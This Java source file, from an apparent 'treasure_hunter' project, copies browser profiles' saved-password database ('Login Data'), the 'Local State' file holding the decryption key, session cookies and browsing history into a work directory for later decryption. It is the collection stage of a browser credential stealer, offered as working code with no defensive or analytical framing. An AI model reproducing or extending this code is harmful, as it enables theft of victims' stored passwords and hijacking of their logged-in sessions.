package com.treasure_hunter_java.decrypt;

import com.treasure_hunter_java.directory.Directory;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.List;

/**
 * Класс CopyFiles отвечает за копирование файлов.
 */
public class CopyFiles {

    /**
     * Рабочая директория приложения.
     */
    private final Path workDirectory = Directory.getWorkDirectory();

    /**
     * Создает директорию для хранения файлов.
     *
     * @param browserName имя браузера
     * @return созданная директория
     */
    public File createDirectory(String browserName) {
        File directory = new File(workDirectory.toString() + browserName);
        if (!directory.exists()) {
            directory.mkdir();
        }
        return directory;
    }

    /**
     * Копирует файлы с данными для расшифровки.
     *
     * @param profiles     список путей к профилям браузеров
     * @param localState   путь к файлу Local State
     * @param browserName  имя браузера
     * @throws IOException если происходит ошибка ввода-вывода
     */
    public void copyLoginData(List<Path> profiles, Path localState, String browserName) throws IOException {
        File directory = createDirectory(browserName);
        Path localStateCopy = Path.of(directory + "/Local State");

        for (Path profile : profiles) {
            Path loginData = Path.of(profile + "/Login Data");
            Path loginDataCopy = Path.of(directory + "/Login Data");

            if (Files.exists(loginData)) {
                Files.copy(loginData, loginDataCopy, StandardCopyOption.REPLACE_EXISTING);
            }
        }

        if (Files.exists(localState)) {
            Files.copy(localState, localStateCopy, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    /**
     * Копирует файлы с cookie.
     *
     * @param profiles    список путей к профилям браузеров
     * @param browserName имя браузера
     * @throws IOException если происходит ошибка ввода-вывода
     */
    public void copyCookies(List<Path> profiles, String browserName) throws IOException {
        File directory = createDirectory(browserName);

        for (Path profile : profiles) {
            Path cookies = Path.of(profile + "/Network/Cookies");
            Path cookiesCopy = Path.of(directory + "/Cookies");

            if (Files.exists(cookies)) {
                Files.copy(cookies, cookiesCopy, StandardCopyOption.REPLACE_EXISTING);
            }
        }
    }

    /**
     * Копирует файлы с историей браузера.
     *
     * @param profiles    список путей к профилям браузеров
     * @param browserName имя браузера
     * @throws IOException если происходит ошибка ввода-вывода
     */
    public void copyHistory(List<Path> profiles, String browserName) throws IOException {
        File directory = createDirectory(browserName);

        for (Path profile : profiles) {
            Path history = Path.of(profile + "/History");
            Path historyCopy = Path.of(directory + "/History");

            if (Files.exists(history) && !Files.exists(historyCopy)) {
                Files.copy(history, historyCopy, StandardCopyOption.REPLACE_EXISTING);
            }
        }
    }
}